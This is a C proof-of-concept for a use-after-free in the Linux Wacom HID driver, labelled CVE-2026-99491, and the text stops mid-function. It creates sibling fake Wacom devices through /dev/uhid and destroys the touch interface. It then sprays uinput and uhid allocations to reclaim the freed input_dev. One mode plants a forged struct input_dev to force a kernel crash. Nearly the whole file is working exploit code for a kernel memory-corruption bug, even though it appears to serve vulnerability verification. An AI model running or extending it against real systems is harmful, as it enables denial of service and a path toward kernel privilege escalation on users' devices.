// CVE-2026-99491 trigger: HID wacom wacom_intuos_pad touch_input UAF.
//
// Userspace only uses /dev/uhid and /dev/uinput (no kernel module, no
// privileges beyond the uhid group).  Two sibling Wacom Intuos5 HID
// devices are created:
//   A = pen/pad interface (PID 0x0027, descriptor 000A, report ID 3 pad)
//   B = touch interface   (PID 0x0027, descriptor 000B, 64-byte vendor)
// Both carry the same phys string so wacom_get_hdev_data() links them into
// one wacom_hdev_data/shared.  B's probe sets shared->touch_input to B's
// input_dev.  Destroying B on the vulnerable 117 kernel leaves
// shared->touch_input dangling (wacom_remove_shared_data() only clears
// shared->touch, not touch_input, and has no synchronize_rcu()).
//
// Oracle without KASAN (117 is KASAN_HW_TAGS only; QEMU has no MTE):
// after B is destroyed, allocate input_dev objects through /dev/uinput.
// If one reclaims B's freed input_dev slab, the next pad report from A
// calls input_report_switch()/input_sync() on that uinput device and the
// SW_MUTE_DEVICE events become readable on its evdev node.  That is a
// cross-device write through a stale pointer: UAF proven functionally.
//
// Build: see build.sh (NDK aarch64 static).
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include <dirent.h>
#include <ctype.h>
#include <linux/input.h>
#include <linux/uinput.h>
#include <linux/uhid.h>

#include "rdesc_gen.h"

static const unsigned char rdesc_kb[] = {
  0x05,0x01,0x09,0x06,0xa1,0x01,0x85,0x01,0x05,0x07,0x19,0xe0,
  0x29,0xe7,0x15,0x00,0x25,0x01,0x75,0x01,0x95,0x08,0x81,0x02,
  0x95,0x01,0x75,0x08,0x81,0x01,0x05,0x07,0x19,0x00,0x29,0x65,
  0x15,0x00,0x25,0x65,0x75,0x08,0x95,0x06,0x81,0x00,0xc0
};

#define WACOM_VID 0x056a
#define WACOM_PID_PEN   0x032b
#define WACOM_PID_TOUCH 0x032c
#define UINPUT_N 8

static int verbose = 1;
static void logmsg(const char *fmt, ...) {
    if (!verbose) return;
    va_list ap; va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    fflush(stderr);
}

struct udev {
    int fd;
    int started;
};

static struct udev *udev_new(int fd) {
    struct udev *u = calloc(1, sizeof(*u));
    u->fd = fd;
    return u;
}

static int uhid_create(int fd, const char *name, const char *phys,
                       const unsigned char *rdesc, unsigned int rlen,
                       unsigned int pid) {
    struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_CREATE2;
    strncpy((char *)ev.u.create2.name, name, sizeof(ev.u.create2.name) - 1);
    strncpy((char *)ev.u.create2.phys, phys, sizeof(ev.u.create2.phys) - 1);
    strncpy((char *)ev.u.create2.uniq, "cve-99491", sizeof(ev.u.create2.uniq) - 1);
    ev.u.create2.rd_size = rlen;
    memcpy(ev.u.create2.rd_data, rdesc, rlen);
    ev.u.create2.bus = BUS_USB;
    ev.u.create2.vendor = WACOM_VID;
    ev.u.create2.product = pid;
    ev.u.create2.version = 0x0106;
    ev.u.create2.country = 0;
    ssize_t w = write(fd, &ev, sizeof(ev));
    if (w != (ssize_t)sizeof(ev)) {
        logmsg("UHID_CREATE2(%s) write=%zd errno=%d\n", name, w, errno);
        return -1;
    }
    return 0;
}

static void uhid_destroy_fd(int fd) {
    struct uhid_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.type = UHID_DESTROY;
    ssize_t w = write(fd, &ev, sizeof(ev));
    logmsg("UHID_DESTROY write=%zd errno=%d\n", w, errno);
}

static int handle_event(struct udev *u, struct uhid_event *ev) {
    switch (ev->type) {
    case UHID_START:
        u->started = 1;
        logmsg("  uhid START\n");
        break;
    case UHID_GET_REPORT: {
        struct uhid_event r;
        memset(&r, 0, sizeof(r));
        r.type = UHID_GET_REPORT_REPLY;
        r.u.get_report_reply.id = ev->u.get_report.id;
        r.u.get_report_reply.err = 0;
        r.u.get_report_reply.size = 64;
        write(u->fd, &r, sizeof(r));
        logmsg("  uhid GET_REPORT rnum=%u rtype=%u -> zero reply\n",
               ev->u.get_report.rnum, ev->u.get_report.rtype);
        break;
    }
    case UHID_SET_REPORT: {
        struct uhid_event r;
        memset(&r, 0, sizeof(r));
        r.type = UHID_SET_REPORT_REPLY;
        r.u.set_report_reply.id = ev->u.set_report.id;
        r.u.set_report_reply.err = 0;
        write(u->fd, &r, sizeof(r));
        logmsg("  uhid SET_REPORT rnum=%u rtype=%u -> ok\n",
               ev->u.set_report.rnum, ev->u.set_report.rtype);
        break;
    }
    case UHID_OPEN:
        logmsg("  uhid OPEN\n");
        break;
    case UHID_CLOSE:
        logmsg("  uhid CLOSE\n");
        break;
    case UHID_STOP:
        logmsg("  uhid STOP\n");
        break;
    case UHID_OUTPUT:
        logmsg("  uhid OUTPUT len=%u\n", ev->u.output.size);
        break;
    default:
        logmsg("  uhid event type=%u\n", ev->type);
        break;
    }
    return 0;
}

static void pump(struct udev *a, struct udev *b, int ms) {
    struct pollfd pfd[2];
    int n = 0;
    if (a) { pfd[n].fd = a->fd; pfd[n].events = POLLIN; n++; }
    if (b) { pfd[n].fd = b->fd; pfd[n].events = POLLIN; n++; }
    int r = poll(pfd, n, ms);
    if (r <= 0) return;
    for (int i = 0; i < n; i++) {
        if (!(pfd[i].revents & POLLIN)) continue;
        struct udev *u = (a && pfd[i].fd == a->fd) ? a : b;
        struct uhid_event ev;
        ssize_t rd = read(u->fd, &ev, sizeof(ev));
        if (rd > 0) handle_event(u, &ev);
    }
}

static void wait_started(struct udev *a, struct udev *b, int ms) {
    int elapsed = 0;
    while (elapsed < ms) {
        if ((!a || a->started) && (!b || b->started)) break;
        pump(a, b, 50);
        elapsed += 50;
    }
}

static int find_event_by_scan(const char *want, char *out, size_t outsz) {
    /* /proc/bus/input/devices is SELinux-denied for shell on 117.
     * Scan the evdev minors and match with EVIOCGNAME instead. */
    for (int i = 0; i < 96; i++) {
        char path[64], name[128];
        snprintf(path, sizeof(path), "/dev/input/event%d", i);
        int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
        if (fd < 0) continue;
        memset(name, 0, sizeof(name));
        if (ioctl(fd, EVIOCGNAME(sizeof(name) - 1), name) >= 0 &&
            !strcmp(name, want)) {
            close(fd);
            snprintf(out, outsz, "%s", path);
            return 0;
        }
        close(fd);
    }
    return -1;
}

static int open_event_by_name(const char *want, char *path, size_t pathsz) {
    if (find_event_by_scan(want, path, pathsz) != 0) return -1;
    return open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
}

static int count_wacom_inputs(char *buf, size_t bufsz) {
    FILE *f = fopen("/proc/bus/input/devices", "r");
    if (!f) return -1;
    char line[512];
    int n = 0;
    size_t off = 0;
    while (fgets(line, sizeof(line), f)) {
        if (!strncmp(line, "N: Name=", 8) && strstr(line, "Wacom")) {
            n++;
            if (off < bufsz) {
                int k = snprintf(buf + off, bufsz - off, "%s", line + 9);
                if (k > 0) off += k;
            }
        }
    }
    fclose(f);
    return n;
}

static int create_uinput(int idx, char *evpath, size_t evsz) {
    int fd = open("/dev/uinput", O_RDWR | O_NONBLOCK);
    if (fd < 0) { logmsg("uinput open: %d (%s)\n", errno, strerror(errno)); return -1; }
    ioctl(fd, UI_SET_EVBIT, EV_SW);
    ioctl(fd, UI_SET_SWBIT, SW_MUTE_DEVICE);

    struct uinput_setup us;
    memset(&us, 0, sizeof(us));
    snprintf(us.name, sizeof(us.name), "uafprobe%02d", idx);
    us.id.bustype = BUS_VIRTUAL;
    us.id.vendor = 0x1234;
    us.id.product = 0x5678;
    us.id.version = 1;
    if (ioctl(fd, UI_DEV_SETUP, &us) < 0) {
        logmsg("UI_DEV_SETUP[%d]: %d (%s)\n", idx, errno, strerror(errno));
        close(fd); return -1;
    }
    if (ioctl(fd, UI_DEV_CREATE) < 0) {
        logmsg("UI_DEV_CREATE[%d]: %d (%s)\n", idx, errno, strerror(errno));
        close(fd); return -1;
    }
    char name[32];
    snprintf(name, sizeof(name), "uafprobe%02d", idx);
    for (int t = 0; t < 40; t++) {
        if (find_event_by_scan(name, evpath, evsz) == 0) return fd;
        usleep(25000);
    }
    logmsg("uinput[%d]: no event node for %s\n", idx, name);
    close(fd);
    return -1;
}


static void show_events(const char *tag, int fd) {
    struct input_event iev[128];
    int n = 0;
    for (;;) {
        ssize_t rd = read(fd, iev, sizeof(iev));
        if (rd <= 0) break;
        int cnt = rd / (ssize_t)sizeof(struct input_event);
        for (int k = 0; k < cnt; k++) {
            logmsg("%s ev type=%u code=%u value=%d\n", tag,
                   iev[k].type, iev[k].code, iev[k].value);
            n++;
        }
    }
    logmsg("%s total_events=%d\n", tag, n);
}

static void show_sw_caps(const char *tag, int fd) {
    unsigned long bits[8];
    memset(bits, 0, sizeof(bits));
    ioctl(fd, EVIOCGBIT(EV_SW, sizeof(bits)), bits);
    int sw_mute = !!(bits[SW_MUTE_DEVICE / (8 * sizeof(long))] &
                     (1UL << (SW_MUTE_DEVICE % (8 * sizeof(long)))));
    unsigned long ev[2] = {0, 0};
    ioctl(fd, EVIOCGBIT(0, sizeof(ev)), ev);
    logmsg("%s EV_SW=%d SW_MUTE=%d\n", tag,
           !!(ev[0] & (1UL << EV_SW)), sw_mute);
}

static int send_pad(int fd, int n) {
    for (int i = 0; i < n; i++) {
        struct uhid_event ev;
        memset(&ev, 0, sizeof(ev));
        ev.type = UHID_INPUT2;
        ev.u.input2.size = 10;
        /* report ID 3 = WACOM_REPORT_INTUOS5PAD, then 9 data bytes */
        ev.u.input2.data[0] = 0x03;   /* WACOM_REPORT_INTUOS5PAD */
        ev.u.input2.data[2] = 0x04;   /* oPid: touch mute toggle */
        ev.u.input2.data[3] = 0x01;   /* button bit 0 */
        ssize_t w = write(fd, &ev, sizeof(ev));
        if (n == 1) {
            unsigned char *bb = (unsigned char *)&ev;
            logmsg("pad bytes: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x write=%zd errno=%d\n",
                   bb[0],bb[1],bb[2],bb[3],bb[4],bb[5],bb[6],bb[7],bb[8],bb[9],bb[10],bb[11],w,errno);
        }
        if (w != (ssize_t)sizeof(ev)) {
            logmsg("UHID_INPUT2 pad write=%zd errno=%d\n", w, errno);
            return -1;
        }
    }
    return 0;
}

static int drain_sw(int *fds, int nfds, int *per_fd) {
    int hits = 0;
    for (int i = 0; i < nfds; i++) per_fd[i] = 0;
    for (int i = 0; i < nfds; i++) {
        struct input_event iev[64];
        for (;;) {
            ssize_t rd = read(fds[i], iev, sizeof(iev));
            if (rd <= 0) break;
            int cnt = rd / (ssize_t)sizeof(struct input_event);
            for (int k = 0; k < cnt; k++) {
                if (iev[k].type == EV_SW && iev[k].code == SW_MUTE_DEVICE) {
                    per_fd[i]++;
                    hits++;
                }
            }
        }
    }
    return hits;
}

static void dump_groups(void) {
    gid_t g[64];
    int n = getgroups(64, g);
    logmsg("uid=%d euid=%d gid=%d", getuid(), geteuid(), getgid());
    if (n > 0) {
        logmsg(" groups=");
        for (int i = 0; i < n; i++) logmsg("%d%s", g[i], i + 1 < n ? "," : "");
    }
    logmsg("\n");
}

static struct udev *make_pair(const char *physA, const char *physB,
                              struct udev **outA, struct udev **outB) {
    int fa = open("/dev/uhid", O_RDWR | O_CLOEXEC | O_NONBLOCK);
    int fb = open("/dev/uhid", O_RDWR | O_CLOEXEC | O_NONBLOCK);
    if (fa < 0 || fb < 0) {
        logmsg("/dev/uhid open failed: %d (%s) fa=%d fb=%d\n",
               errno, strerror(errno), fa, fb);
        return NULL;
    }
    struct udev *a = udev_new(fa), *b = udev_new(fb);
    if (uhid_create(fa, "Wacom Cintiq 27QHD Pen", physA,
                    rdesc_i5pen, rdesc_i5pen_len, 0x032b) != 0) {
        return NULL;
    }
    /* Probe A first and let its wacom_add_shared_data() publish the
     * wacom_hdev_data entry before B probes (real USB interfaces probe
     * sequentially; this also avoids the concurrent-probe state race the
     * upstream fix mentions). */
    wait_started(a, NULL, 4000);
    for (int i = 0; i < 20; i++) pump(a, NULL, 25);
    usleep(200000);
    if (uhid_create(fb, "Wacom Cintiq 27QHD touch Touch", physB,
                    rdesc_touch, rdesc_touch_len, 0x032c) != 0) {
        return NULL;
    }
    wait_started(a, b, 4000);
    logmsg("started A=%d B=%d\n", a->started, b->started);
    /* Keep servicing feature report requests during probe/registration. */
    for (int i = 0; i < 20; i++) pump(a, b, 50);
    *outA = a; *outB = b;
    return a;
}

static void dump_wacom(void) {
    char buf[2048];
    int n = count_wacom_inputs(buf, sizeof(buf));
    logmsg("wacom input devices=%d\n%s", n, buf);
    DIR *d = opendir("/sys/bus/hid/devices");
    if (!d) return;
    struct dirent *de;
    while ((de = readdir(d))) {
        if (de->d_name[0] == '.') continue;
        char p[256], line[256];
        snprintf(p, sizeof(p), "/sys/bus/hid/devices/%s/uevent", de->d_name);
        FILE *f = fopen(p, "r");
        if (!f) continue;
        logmsg("hid %s:", de->d_name);
        while (fgets(line, sizeof(line), f)) {
            if (!strncmp(line, "HID_NAME=", 9) || !strncmp(line, "HID_ID=", 7)) {
                line[strcspn(line, "\n")] = 0;
                logmsg(" %s", line);
            }
        }
        logmsg("\n");
        fclose(f);
    }
    closedir(d);
}

int main(int argc, char **argv) {
    const char *mode = argc > 1 ? argv[1] : "probe";
    cpu_set_t set;
    CPU_ZERO(&set); CPU_SET(0, &set);
    sched_setaffinity(0, sizeof(set), &set);

    dump_groups();
    logmsg("mode=%s\n", mode);

    if (!strcmp(mode, "probe")) {
        struct udev *a, *b;
        if (!make_pair("uhid/wacom", "uhid/wacom", &a, &b)) return 2;
        sleep(1);
        for (int i = 0; i < 10; i++) pump(a, b, 100);
        dump_wacom();
        uhid_destroy_fd(a->fd);
        uhid_destroy_fd(b->fd);
        return 0;
    }

    if (!strcmp(mode, "stale") || !strcmp(mode, "neg")) {
        const char *physB = !strcmp(mode, "neg") ? "other/wacom" : "uhid/wacom";
        struct udev *a, *b;
        if (!make_pair("uhid/wacom", physB, &a, &b)) return 2;
        sleep(1);
        for (int i = 0; i < 10; i++) pump(a, b, 100);
        dump_wacom();

        /* Control 1: before touch disconnect, the pad report must reach
         * B's touch input (which advertises EV_SW for WACOM_27QHDT/0x32c).
         * The evdev read below proves wacom_intuos_pad -> shared->touch_input
         * is live and working before the sibling is removed. */
        char bpath[64] = {0};
        int bfd = open_event_by_name("Wacom Cintiq 27QHD touch Finger", bpath, sizeof(bpath));
        logmsg("touch evdev=%s fd=%d errno=%d\n", bpath, bfd, errno);
        int pre_hits = 0, pre_syn = 0;
        if (bfd >= 0) {
            send_pad(a->fd, 2);
            usleep(80000);
            struct input_event iev[64];
            for (;;) {
                ssize_t rd = read(bfd, iev, sizeof(iev));
                if (rd <= 0) break;
                int cnt = rd / (ssize_t)sizeof(struct input_event);
                for (int k = 0; k < cnt; k++) {
                    if (iev[k].type == EV_SW && iev[k].code == SW_MUTE_DEVICE) pre_hits++;
                    if (iev[k].type == EV_SYN && iev[k].code == SYN_REPORT) pre_syn++;
                }
            }
            logmsg("PRE_DISCONNECT touch: SW_MUTE=%d SYN=%d\n", pre_hits, pre_syn);
            close(bfd);
        }

        logmsg("destroying touch sibling B (phys=%s)\n", physB);
        uhid_destroy_fd(b->fd);
        close(b->fd);
        for (int i = 0; i < 10; i++) pump(a, NULL, 50);
        usleep(300000);

        int efds[UINPUT_N];
        char eps[UINPUT_N][64];
        int nu = 0;
        memset(efds, -1, sizeof(efds));
        for (int i = 0; i < UINPUT_N; i++) {
            pump(a, NULL, 5);
            if (create_uinput(i, eps[i], sizeof(eps[i])) >= 0) {
                efds[nu] = open(eps[i], O_RDONLY | O_NONBLOCK);
                logmsg("uinput[%d] %s open=%d errno=%d\n",
                       i, eps[i], efds[nu], errno);
                if (efds[nu] >= 0) nu++;
            } else {
                break;
            }
        }
        logmsg("uinput evdev fds=%d\n", nu);

        int hits = 0, per[UINPUT_N];
        for (int round = 0; round < 20; round++) {
            if (send_pad(a->fd, 1) != 0) break;
            usleep(20000);
            hits += drain_sw(efds, nu, per);
        }
        for (int i = 0; i < nu; i++)
            logmsg("evdev %s SW_MUTE hits=%d\n", eps[i], per[i]);
        logmsg("RESULT mode=%s pre_sw=%d pre_syn=%d post_sw=%d\n", mode, pre_hits, pre_syn, hits);

        uhid_destroy_fd(a->fd);
        for (int i = 0; i < nu; i++) close(efds[i]);
        return hits > 0 ? 0 : 1;
    }

    if (!strcmp(mode, "crash")) {
        struct udev *a, *b;
        if (!make_pair("uhid/wacom", "uhid/wacom", &a, &b)) return 2;
        sleep(1);
        for (int i = 0; i < 10; i++) pump(a, b, 100);
        char bpath[64] = {0};
        int bfd = open_event_by_name("Wacom Cintiq 27QHD touch Finger", bpath, sizeof(bpath));
        int pre = 0;
        if (bfd >= 0) {
            send_pad(a->fd, 2); usleep(80000);
            struct input_event iev[64];
            for (;;) { ssize_t rd = read(bfd, iev, sizeof(iev)); if (rd <= 0) break;
                for (int k = 0; k < rd/(ssize_t)sizeof(*iev); k++) if (iev[k].type == EV_SW && iev[k].code == SW_MUTE_DEVICE) pre++; }
            close(bfd);
        }
        logmsg("crash pre_sw=%d destroying B\n", pre);
        uhid_destroy_fd(b->fd); close(b->fd);
        for (int i = 0; i < 6; i++) pump(a, NULL, 50);
        usleep(300000);

        /* Reclaim the freed input_dev (kmalloc-2k) with a fully controlled
         * 1600-byte UHID report-descriptor buffer.  Fake struct input_dev:
         *   evbit[0] |= EV_SW        (0x28)
         *   swbit[0] |= SW_MUTE_DEVICE(14) (0xc8)
         *   event_lock (0x1f0) = 0
         *   vals (0x5f0) = NULL
         * The second pad report has value=1 and reaches input_event_dispose()
         * which writes dev->vals[0] -> NULL deref / kernel Oops. */
        unsigned char fake[1600];
        memset(fake, 0, sizeof(fake));
        *(unsigned long *)(fake + 0x28) = 1UL << EV_SW;
        *(unsigned long *)(fake + 0xc8) = 1UL << SW_MUTE_DEVICE;
        for (int i = 0; i < 64; i++) {
            int f = open("/dev/uhid", O_RDWR | O_CLOEXEC | O_NONBLOCK);
            if (f < 0) break;
            struct uhid_event ev;
            memset(&ev, 0, sizeof(ev));
            ev.type = UHID_CREATE2;
            snprintf((char *)ev.u.create2.name, sizeof(ev.u.create2.name), "fakeinput%02d", i);
            snprintf((char *)ev.u.create2.phys, sizeof(ev.u.create2.phys), "fake%02d/wacom", i);
            ev.u.create2.rd_size = sizeof(fake);
            memcpy(ev.u.create2.rd_data, fake, sizeof(fake));
            ev.u.create2.bus = BUS_USB;
            ev.u.create2.vendor = 0x1234;
            ev.u.create2.product = 0x5678;
            write(f, &ev, sizeof(ev));
            pump(a, NULL, 3);
        }
        logmsg("crash fake devices created; sending pad reports\n");
        for (int round = 0; round < 200; round++) {
            send_pad(a->fd, 1);
            pump(a, NULL, 2);
            usleep(3000);
        }
        logmsg("crash survived (no fake-object hit)\n");
        return 1;
    }

    if (!strcmp(mode, "sprayneg")) {
        struct udev *a, *b;
        if (!make_pair("uhid/wacom", "other/wacom", &a, &b)) return 2;
        sleep(1);
        for (int i = 0; i < 10; i++) pump(a, b, 100);
        logmsg("sprayneg destroying non-sibling B\n");
        uhid_destroy_fd(b->fd); close(b->fd);
        for (int i = 0; i < 6; i++) pump(a, NULL, 50);
        usleep(300000);
        enum { SPRAY = 32 };
        int ns = 0;
        for (int i = 0; i < SPRAY; i++) {
            int f = open("/dev/uhid", O_RDWR | O_CLOEXEC | O_NONBLOCK);
            if (f < 0) break;
            struct udev *u = udev_new(f);
            char phys[32];
            snprintf(phys, sizeof(phys), "spray%02d/wacom", i);
            uhid_create(f, "Wacom Cintiq 27QHD touch Spray", phys,
                        rdesc_touch, rdesc_touch_len, 0x032c);
            wait_started(u, NULL, 1000);
            pump(a, u, 10);
            ns++;
        }
        sleep(1);
        for (int i = 0; i < 20; i++) pump(a, NULL, 50);
        int evfds[128]; int nev = 0;
        char evpaths[128][64];
        for (int i = 0; i < 160 && nev < 128; i++) {
            char path[64], name[128];
            snprintf(path, sizeof(path), "/dev/input/event%d", i);
            int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
            if (fd < 0) continue;
            memset(name, 0, sizeof(name));
            if (ioctl(fd, EVIOCGNAME(sizeof(name)-1), name) >= 0 &&
                !strcmp(name, "Wacom Cintiq 27QHD touch Finger")) {
                snprintf(evpaths[nev], sizeof(evpaths[nev]), "%s", path);
                evfds[nev++] = fd;
            } else close(fd);
        }
        int post = 0;
        for (int round = 0; round < 60; round++) {
            send_pad(a->fd, 1);
            usleep(5000);
            for (int i = 0; i < nev; i++) {
                struct input_event iev[64];
                for (;;) { ssize_t rd = read(evfds[i], iev, sizeof(iev)); if (rd <= 0) break;
                    for (int k = 0; k < rd/(ssize_t)sizeof(*iev); k++)
                        if (iev[k].type == EV_SW && iev[k].code == SW_MUTE_DEVICE) post++;
                }
            }
        }
        logmsg("RESULT mode=sprayneg devices=%d evdevs=%d post_sw=%d\n", ns, nev, post);
        uhid_destroy_fd(a->fd);
        return post == 0 ? 0 : 1;
    }

    if (!strcmp(mode, "spray2")) {
        struct udev *a, *b;
        if (!make_pair("uhid/wacom", "uhid/wacom", &a, &b)) return 2;
        sleep(1);
        for (int i = 0; i < 10; i++) pump(a, b, 100);
        char bpath[64] = {0};
        int bfd = open_event_by_name("Wacom Cintiq 27QHD touch Finger", bpath, sizeof(bpath));
        int pre = 0;
        if (bfd >= 0) {
            send_pad(a->fd, 2); usleep(80000);
            struct input_event iev[64];
            for (;;) { ssize_t rd = read(bfd, iev, sizeof(iev)); if (rd <= 0) break;
                for (int k = 0; k < rd/(ssize_t)sizeof(*iev); k++) if (iev[k].type == EV_SW && iev[k].code == SW_MUTE_DEVICE) pre++; }
            close(bfd);
        }
        logmsg("spray2 live-sibling pre_sw=%d\n", pre);

        /* Create the reclaim spray while B is still alive.  These are not
         * siblings of A (different phys / same-PID prefix), so if A's
         * touch_input could be overwritten by a spray we would see SW
         * events here, before B is removed.  Expected: 0. */
        enum { SPRAY = 32 };
        int sfds[SPRAY]; int ns = 0;
        for (int i = 0; i < SPRAY; i++) {
            int f = open("/dev/uhid", O_RDWR | O_CLOEXEC | O_NONBLOCK);
            if (f < 0) break;
            struct udev *u = udev_new(f);
            char phys[32];
            snprintf(phys, sizeof(phys), "spray%02d/wacom", i);
            uhid_create(f, "Wacom Cintiq 27QHD touch Spray", phys,
                        rdesc_touch, rdesc_touch_len, 0x032c);
            wait_started(u, NULL, 1000);
            pump(a, u, 10);
            sfds[ns++] = f;
        }
        sleep(1);
        for (int i = 0; i < 20; i++) pump(a, NULL, 50);
        int evfds[128]; int nev = 0;
        char evpaths[128][64];
        for (int i = 0; i < 160 && nev < 128; i++) {
            char path[64], name[128];
            snprintf(path, sizeof(path), "/dev/input/event%d", i);
            int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
            if (fd < 0) continue;
            memset(name, 0, sizeof(name));
            if (ioctl(fd, EVIOCGNAME(sizeof(name)-1), name) >= 0 &&
                !strcmp(name, "Wacom Cintiq 27QHD touch Finger") &&
                strcmp(path, bpath) != 0) {
                snprintf(evpaths[nev], sizeof(evpaths[nev]), "%s", path);
                evfds[nev++] = fd;
            } else close(fd);
        }
        logmsg("spray2 devices=%d evdevs=%d\n", ns, nev);

        int ctl = 0;
        for (int round = 0; round < 20; round++) {
            send_pad(a->fd, 1);
            usleep(5000);
            for (int i = 0; i < nev; i++) {
                struct input_event iev[64];
                for (;;) { ssize_t rd = read(evfds[i], iev, sizeof(iev)); if (rd <= 0) break;
                    for (int k = 0; k < rd/(ssize_t)sizeof(*iev); k++)
                        if (iev[k].type == EV_SW && iev[k].code == SW_MUTE_DEVICE) ctl++;
                }
            }
        }
        logmsg("CONTROL spray-while-B-alive SW_MUTE=%d\n", ctl);

        /* Remove B: 117 wacom_remove_shared_data() clears shared->touch but
         * NOT shared->touch_input (no rcu_assign_pointer, no
         * synchronize_rcu), so A's next pad report uses the freed
         * input_dev pointer.  The spray above has already placed live
         * Wacom input_devs in that cache to catch the reuse. */
        logmsg("spray2 destroying B now\n");
        uhid_destroy_fd(b->fd); close(b->fd);
        for (int i = 0; i < 6; i++) pump(a, NULL, 50);
        usleep(300000);

        int post = 0, post_syn = 0;
        for (int round = 0; round < 60; round++) {
            send_pad(a->fd, 1);
            usleep(5000);
            for (int i = 0; i < nev; i++) {
                struct input_event iev[64];
                for (;;) { ssize_t rd = read(evfds[i], iev, sizeof(iev)); if (rd <= 0) break;
                    for (int k = 0; k < rd/(ssize_t)sizeof(*iev); k++) {
                        if (iev[k].type == EV_SW && iev[k].code == SW_MUTE_DEVICE) {
                            if (post < 12) logmsg("UAF_HIT evdev=%s round=%d value=%d\n", evpaths[i], round, iev[k].value);
                            post++;
                        }
                        if (iev[k].type == EV_SYN) post_syn++;
                    }
                }
            }
        }
        logmsg("RESULT mode=spray2 pre_sw=%d control_sw=%d post_sw=%d post_syn=%d\n",
               pre, ctl, post, post_syn);
        uhid_destroy_fd(a->fd);
        return post > 0 && ctl == 0 ? 0 : 1;
    }

    if (!strcmp(mode, "spray")) {
        struct udev *a, *b;
        if (!make_pair("uhid/wacom", "uhid/wacom", &a, &b)) return 2;
        sleep(1);
        for (int i = 0; i < 10; i++) pump(a, b, 100);
        char bpath[64] = {0};
        int bfd = open_event_by_name("Wacom Cintiq 27QHD touch Finger", bpath, sizeof(bpath));
        int pre = 0;
        if (bfd >= 0) {
            send_pad(a->fd, 2); usleep(80000);
            struct input_event iev[64];
            for (;;) { ssize_t rd = read(bfd, iev, sizeof(iev)); if (rd <= 0) break;
                for (int k = 0; k < rd/(ssize_t)sizeof(*iev); k++) if (iev[k].type == EV_SW && iev[k].code == SW_MUTE_DEVICE) pre++; }
            logmsg("spray pre_sw=%d touch=%s\n", pre, bpath);
            close(bfd);
        }
        logmsg("spray destroying B\n");
        uhid_destroy_fd(b->fd); close(b->fd);
        for (int i = 0; i < 6; i++) pump(a, NULL, 50);
        usleep(300000);

        /* Reclaim B's freed input_dev (kmalloc-2k) with real Wacom touch
         * input_dev allocations, each using the same input_allocate_device()
         * call site as the victim.  Different phys keeps them out of A's
         * wacom_hdev_data, so they cannot overwrite shared->touch_input. */
        enum { SPRAY = 32 };
        int sfds[SPRAY]; int ns = 0;
        for (int i = 0; i < SPRAY; i++) {
            int f = open("/dev/uhid", O_RDWR | O_CLOEXEC | O_NONBLOCK);
            if (f < 0) break;
            struct udev *u = udev_new(f);
            char phys[32];
            snprintf(phys, sizeof(phys), "spray%02d/wacom", i);
            uhid_create(f, "Wacom Cintiq 27QHD touch Spray", phys,
                        rdesc_touch, rdesc_touch_len, 0x032c);
            wait_started(u, NULL, 1000);
            pump(a, u, 10);
            sfds[ns++] = f;
        }
        logmsg("spray created %d touch devices\n", ns);
        sleep(1);
        for (int i = 0; i < 20; i++) pump(a, NULL, 50);

        /* Open every evdev named like the touch sibling. */
        int evfds[128]; int nev = 0;
        char evpaths[128][64];
        for (int i = 0; i < 160 && nev < 128; i++) {
            char path[64], name[128];
            snprintf(path, sizeof(path), "/dev/input/event%d", i);
            int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
            if (fd < 0) continue;
            memset(name, 0, sizeof(name));
            if (ioctl(fd, EVIOCGNAME(sizeof(name)-1), name) >= 0 &&
                !strcmp(name, "Wacom Cintiq 27QHD touch Finger")) {
                snprintf(evpaths[nev], sizeof(evpaths[nev]), "%s", path);
                evfds[nev++] = fd;
            } else close(fd);
        }
        logmsg("spray touch evdevs=%d\n", nev);

        char apath[64] = {0};
        int apad = open_event_by_name("Wacom Cintiq 27QHD touch Pad", apath, sizeof(apath));
        int post = 0, asyn = 0;
        for (int round = 0; round < 100; round++) {
            send_pad(a->fd, 1);
            if (apad >= 0) {
                struct input_event iev[64];
                for (;;) { ssize_t rd = read(apad, iev, sizeof(iev)); if (rd <= 0) break;
                    for (int k = 0; k < rd/(ssize_t)sizeof(*iev); k++) if (iev[k].type == EV_SYN) asyn++; }
            }
            usleep(3000);
            for (int i = 0; i < nev; i++) {
                struct input_event iev[64];
                for (;;) { ssize_t rd = read(evfds[i], iev, sizeof(iev)); if (rd <= 0) break;
                    for (int k = 0; k < rd/(ssize_t)sizeof(*iev); k++)
                        if (iev[k].type == EV_SW && iev[k].code == SW_MUTE_DEVICE) {
                            if (post < 20) logmsg("SPRAY_HIT evdev=%s round=%d value=%d\n", evpaths[i], round, iev[k].value);
                            post++;
                        } }
            }
        }
        logmsg("RESULT mode=spray pre_sw=%d post_sw=%d a_pad_syn=%d\n", pre, post, asyn);
        uhid_destroy_fd(a->fd);
        return post > 0 ? 0 : 1;
    }

    if (!strcmp(mode, "qhd2")) {
        int fa = open("/dev/uhid", O_RDWR | O_CLOEXEC | O_NONBLOCK);
        int fb = open("/dev/uhid", O_RDWR | O_CLOEXEC | O_NONBLOCK);
        if (fa < 0 || fb < 0) return 2;
        struct udev *a = udev_new(fa), *b = udev_new(fb);
        uhid_create(fa, "Wacom Cintiq 27QHD Pen", "uhid/wacom",
                    rdesc_i5pen, rdesc_i5pen_len, 0x032b);
        wait_started(a, NULL, 3000);
        for (int i = 0; i < 10; i++) pump(a, NULL, 50);
        usleep(200000);
        uhid_create(fb, "Wacom Cintiq 27QHD touch Touch", "uhid/wacom",
                    rdesc_touch, rdesc_touch_len, 0x032c);
        wait_started(a, b, 3000);
        sleep(1);
        for (int i = 0; i < 10; i++) pump(a, b, 100);
        char apath[64] = {0}, bpath[64] = {0};
        int apad = open_event_by_name("Wacom Cintiq 27QHD touch Pad", apath, sizeof(apath));
